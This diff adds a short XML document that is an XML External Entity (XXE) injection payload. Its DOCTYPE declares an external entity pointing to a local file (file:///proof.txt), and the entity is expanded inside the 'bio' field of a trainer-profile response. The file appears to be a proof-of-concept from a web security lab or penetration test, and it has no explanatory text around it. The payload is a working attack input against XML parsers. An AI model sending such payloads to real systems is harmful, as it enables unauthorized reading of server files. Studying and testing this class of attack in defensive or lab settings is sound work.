@@ -1,0 +1,6 @@
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data ANY >
+<!ENTITY bio SYSTEM "file:///proof.txt">
+]>
+<response><id>1</id><name>Robin Marjan</name><proffesion>Web Development</proffesion><bio>&bio;</bio><imgPath>/assets/img/trainers/1.jpg</imgPath></response>
